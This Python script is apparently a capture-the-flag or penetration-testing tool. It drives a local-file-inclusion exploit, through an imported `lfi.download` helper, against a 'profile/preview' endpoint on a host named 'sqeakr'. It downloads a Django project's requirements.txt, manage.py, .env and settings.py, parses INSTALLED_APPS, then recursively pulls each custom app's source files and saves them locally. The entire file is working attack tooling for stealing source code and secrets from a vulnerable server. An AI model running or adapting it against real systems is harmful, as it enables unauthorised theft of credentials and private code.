import re
import os
import sys

PATH_SEP = '/'

def os_path_join(*args):
    return PATH_SEP.join(args)


# =====================
# Do It Yourself
def magicGet(fpath, root=None):
    rpath = os_path_join(root, fpath)
    from lfi import download
    url = 'http://sqeakr/api/profile/preview/'
    content = download(url, rpath)
    if content == 'None':
        return ''
    return content

# =====================

class FileManager:

    def __init__(self, root, pname, lroot):
        self.prjRoot = root
        self.prjName = pname
        self.lprjRoot = lroot
        if not os.path.exists(self.lprjRoot):
            os.makedirs(self.lprjRoot)

    def getFile(self, fpath):

        # skip download if already downloaded
        # TODO: create saved file that already know 404
        target = os_path_join(self.lprjRoot, fpath)
        if os.path.exists(target):
            return open(target).read()

        data = magicGet(fpath, root=self.prjRoot)
        if not data:
            return

        # download to lprjRoot/prjName ...
        if not os.path.exists(target):
            if not os.path.exists(os.path.dirname(target)):
                os.makedirs(os.path.dirname(target))
            _data = data
            if isinstance(data, str):
                _data = data.encode()
            with open(target, 'wb') as f:
                f.write(_data)

        # read out
        return data


def find_installed_app(content):
    lines = content.split('\n')
    seg = []
    custom_apps = []
    for line in lines:
        line = line.strip()
        if line.startswith('INSTALLED_APPS'):
            seg.append(line)
        elif len(seg) > 0:
            seg.append(line)
            if ']' in line:
                break
    apps = re.findall(r'"([\w.]+)"', ''.join(seg))
    apps += re.findall(r"'([\w.]+)'", ''.join(seg))
    for app in apps:
        if not app.startswith('django.contrib'):
            custom_apps.append(app)
    return custom_apps

common_files = ("__init__.py .env apps.py urls.py settings.py constants.py models.py wsgi.py asgi.py views%(se)s__init__.py" % dict(se=PATH_SEP)).split(' ')

if __name__ == '__main__':
    proj_root = sys.argv[1].rstrip('/')
    proj_name = os.path.basename(proj_root) if len(sys.argv) <= 2 else sys.argv[2]
    local_proj_root = proj_root if len(sys.argv) <= 3 else sys.argv[3]
    print('[+] project root: ' + proj_root )
    print('[+] local project root: ' + local_proj_root )
    mgr = FileManager(proj_root, proj_name, local_proj_root)

    
    for f in ['requirements.txt', 'manage.py']:
        c1 = mgr.getFile(f)
        print('[%s] %s' % ('+' if c1 else '-', f))

    for f in common_files:
        if f == 'settings.py':
            continue # handle settings.py later
        _fp = os_path_join(proj_name, f)
        c1 = mgr.getFile(_fp)
        print('[%s] %s' % ('+' if c1 else '-', _fp))


    # find settings.py
    setting_path = os_path_join(proj_name, 'settings.py')
    c1 = mgr.getFile(setting_path)
    if c1:
        custom_apps = find_installed_app(c1)
        print(custom_apps)
        for capp in custom_apps:
            for f in common_files:
                fp = os_path_join(capp, f)
                c2 = mgr.getFile(fp)
                print('[%s] %s' % ('+' if c2 else '-', fp))
                if c2 and f.endswith('__init__.py'):
                    cwd = fp[:fp.rfind(PATH_SEP)]
                    modules = re.findall(r'from .([^. ]+) import', c2)
                    for mod in modules:
                        mfp = os_path_join(cwd, mod + '.py')
                        c3 = mgr.getFile(mfp)
                        print('[%s] %s' % ('+' if c3 else '-', mfp))
